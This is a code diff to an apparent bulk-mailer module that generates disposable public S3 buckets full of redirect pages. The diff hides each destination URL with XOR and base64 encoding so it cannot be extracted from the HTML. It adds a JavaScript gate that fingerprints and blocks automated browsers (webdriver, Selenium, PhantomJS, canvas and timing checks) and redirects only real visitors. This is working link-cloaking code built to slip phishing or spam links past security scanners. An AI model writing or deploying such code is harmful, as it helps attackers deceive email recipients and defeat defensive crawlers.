@@ -8,12 +8,81 @@ from typing import Optional
 logger = logging.getLogger("mailer.s3_redirect")
 
 
-def _redirect_html(destination: str) -> str:
+def _obfuscate_url(url: str) -> str:
+    """XOR-obfuscate the destination URL so it's not grep-able from the
+    HTML source. The JS on the page reverses it at runtime."""
+    import base64
+    key = secrets.token_bytes(1)[0] | 1  # non-zero single-byte XOR key
+    xored = bytes(b ^ key for b in url.encode("utf-8"))
+    payload = bytes([key]) + xored
+    return base64.b64encode(payload).decode("ascii")
+
+
+def _redirect_html(destination: str, bot_filter: bool = False) -> str:
+    """Generate the redirect HTML page. When bot_filter=True, uses a
+    multi-layer JS bot detection gate instead of a bare meta-refresh.
+    The destination URL is XOR-obfuscated either way so crawlers can't
+    extract it from the static HTML."""
+    if not bot_filter:
+        enc = _obfuscate_url(destination)
+        return (
+            '<!DOCTYPE html><html><head><meta charset="utf-8">'
+            '<script>'
+            f'(function(){{var d=atob("{enc}");var k=d.charCodeAt(0);'
+            'var u="";for(var i=1;i<d.length;i++){u+=String.fromCharCode(d.charCodeAt(i)^k);}'
+            'window.location.replace(u);})()'
+            '</script></head><body></body></html>'
+        )
+
+    enc = _obfuscate_url(destination)
     return (
-        '<!DOCTYPE html><html><head>'
-        '<meta http-equiv="refresh" content="0;url=' + destination + '">'
-        '<script>window.location.replace(' + repr(destination) + ');</script>'
-        '</head><body></body></html>'
+        '<!DOCTYPE html><html><head><meta charset="utf-8">'
+        '<style>body{margin:0;font-family:sans-serif;display:flex;align-items:center;'
+        'justify-content:center;min-height:100vh;background:#fafafa;color:#333}'
+        '.ld{width:28px;height:28px;border:3px solid #ddd;border-top-color:#555;'
+        'border-radius:50%%;animation:s .7s linear infinite}'
+        '@keyframes s{to{transform:rotate(360deg)}}</style>'
+        '</head><body><div class="ld"></div>'
+        '<script>'
+        '(function(){'
+        'var _e="' + enc + '";'
+        'function _d(e){var d=atob(e);var k=d.charCodeAt(0);var u="";'
+        'for(var i=1;i<d.length;i++){u+=String.fromCharCode(d.charCodeAt(i)^k);}return u;}'
+
+        'var dominated=false;'
+        'if(navigator.webdriver)dominated=true;'
+        'if(window._phantom||window.callPhantom||window.__phantomas)dominated=true;'
+        'if(window._selenium_ide_recorder||window.__webdriver_evaluate||window.__driver_evaluate)dominated=true;'
+        'if(document.__selenium_unwrapped||document.__webdriver_evaluate||document.__fxdriver_evaluate)dominated=true;'
+        'if(navigator.languages===undefined||navigator.languages.length===0)dominated=true;'
+        'if(!window.chrome&&/Chrome/.test(navigator.userAgent))dominated=true;'
+        'if(navigator.plugins===undefined)dominated=true;'
+
+        'var t0=Date.now();'
+
+        'var cOk=false;'
+        'try{'
+        'var cv=document.createElement("canvas");cv.width=60;cv.height=20;'
+        'var cx=cv.getContext("2d");'
+        'cx.textBaseline="top";cx.font="14px Arial";cx.fillStyle="#a1c";'
+        'cx.fillRect(0,0,60,20);cx.fillStyle="#1a3";cx.fillText("bv",2,0);'
+        'var td=cx.getImageData(0,0,60,20).data;'
+        'var sum=0;for(var i=0;i<td.length;i+=4){sum+=td[i]+td[i+1]+td[i+2];}'
+        'cOk=(sum>0&&sum<td.length*200);'
+        '}catch(e){cOk=true;}'
+
+        'var sOk=(screen.width>0&&screen.height>0&&window.outerWidth>0);'
+
+        'function go(){'
+        'var dt=Date.now()-t0;'
+        'if(dominated)return;'
+        'if(dt<40)return;'
+        'if(!cOk&&!sOk)return;'
+        'window.location.replace(_d(_e));'
+        '}'
+        'setTimeout(go,150+Math.floor(Math.random()*350));'
+        '})();'
+        '</script></body></html>'
     )
 
 
@@ -175,10 +244,11 @@ def generate_links(
     region: str,
     bucket_prefix: str = "lk",
     tag: str = "",
+    bot_filter: bool = False,
     progress_cb: Optional[callable] = None,
 ) -> list:
-    """Create a fresh public bucket and upload `count` redirect HTMLs.
-    Returns list of path-style public URLs.
+    """Create a fresh public bucket and upload `count` redirect pages.
+    Returns list of path-style public URLs (no .html extension).
     progress_cb(done, total, ok, errors) called after each upload."""
     s3 = make_s3_client(access_key, secret_key, region)
 
@@ -197,13 +267,13 @@ def generate_links(
             logger.warning("Bucket creation retry %d: %s", attempt + 1, e)
             bucket = _new_bucket_name(bucket_prefix, tag)
 
-    body = _redirect_html(destination).encode("utf-8")
+    body = _redirect_html(destination, bot_filter=bot_filter).encode("utf-8")
 
     urls = []
     ok = 0
     errors = 0
     for i in range(count):
-        key = f"{_random_suffix(10)}.html"
+        key = _random_suffix(10)
         try:
             s3.put_object(
                 Bucket=bucket,
